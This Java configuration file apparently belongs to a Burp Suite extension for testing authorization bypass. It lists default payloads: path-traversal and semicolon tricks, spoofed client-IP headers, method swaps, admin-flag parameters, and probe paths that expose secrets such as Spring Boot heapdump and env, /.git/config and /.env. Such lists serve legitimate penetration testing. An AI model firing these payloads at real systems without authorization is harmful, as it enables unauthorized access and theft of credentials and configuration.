package burp.config;

import java.util.Arrays;
import java.util.List;

public class Payloads {
    public static final List<String> defaultQueryPayloads = Arrays.asList("..;/", "/..;/", "%2e%2e%3b", "..%2f", "%2e%2e%2f", "%252e%252e%252f",
            ";", "%3b", ";%09", ";%09..", "/;/;", "//", "/*", "/%20/", "/%09/", "/%00/",
            "%20", "%09", "%23", "%2e", "%2f", "/.", "/./",
            ".json", ".xml", ".html", ".css", ".js");

    public static final List<String> defaultHeaderPayloads = Arrays.asList("X-Forwarded-For: 127.0.0.1", "X-Real-Ip: 127.0.0.1", "X-Custom-IP-Authorization: 127.0.0.1",
            "X-Original-URL: /", "X-Rewrite-URL: /", "X-Originating-IP: 127.0.0.1", "X-Remote-IP: 127.0.0.1",
            "True-Client-IP: 127.0.0.1", "Client-IP: 127.0.0.1", "X-Host: 127.0.0.1",
            "X-Forwarded-Server: 127.0.0.1", "X-HTTP-Host-Override: 127.0.0.1", "Base-Url: 127.0.0.1");

    public static final List<String> defaultMethodPayloads = Arrays.asList("GET -> POST", "POST -> GET", "POST -> PUT", "HTTP/1.1 -> HTTP/1.0");

    public static final List<String> defaultExcludeExts = Arrays.asList(".jpg", ".jpeg", ".png", ".gif", ".ico", ".svg", ".webp", ".css", ".js", ".vue", ".map",
            ".woff", ".woff2", ".ttf", ".eot", ".mp4", ".mp3", ".avi", ".ts", ".pdf", ".zip", ".rar", ".tar", ".gz", ".doc", ".docx", ".xls", ".xlsx");

    public static final List<String> defaultWhitelist = Arrays.asList("target.com", "api.target.com");

    public static final List<String> defaultRegexKeywords = Arrays.asList("\"code\":-1", "\"code\":401\"", "\"code\":403\"", "\"msg\":\"未授权\"", "\"msg\":\"无权限\"",
            "\"msg\":\"权限不足\"", "\"msg\":\"请先登录\"", "\"message\":\"未授权\"", "\"message\":\"Access Denied\"","\"success\":\"false\"", "登录已过期", "登录超时", "请先登录", "未登录", "无效的token", "token expired", "invalid token",
            "没有权限访问", "Access Denied", "Unauthorized");

    public static final List<String> defaultWafFingerprints = Arrays.asList(
            "未知 WAF (自研/硬件): (?i)(事件ID[:：]\\s*[a-zA-Z0-9\\-]+|您的请求疑似攻击行为|Web应用防火墙拦截|被安全系统拦截)");

    public static final List<String> defaultCvePayloads = Arrays.asList("/api/v1/terminal/sessions/?limit=1", /* JumpServer 未授权 */
            "/actuator/env", "/actuator/mappings", "/actuator/heapdump", /* Spring Boot */
            "/swagger-ui.html", "/v2/api-docs", "/v3/api-docs", "/swagger-resources", /* Swagger */
            "/druid/index.html", /* Druid */
            "/solr/", /* Solr */
            "/console/login/LoginForm.jsp", /* Weblogic */
            "/.git/config", "/.svn/entries", "/.env" /* 源码泄露 */ );

    public static final List<String> defaultHostPayloads = Arrays.asList("localhost", "127.0.0.1", "0.0.0.0", "[::1]", "10.0.0.1");

    public static final List<String> defaultHppPayloads = Arrays.asList("admin=true", "admin=1", "role=admin", "is_admin=1", "access=true");

}
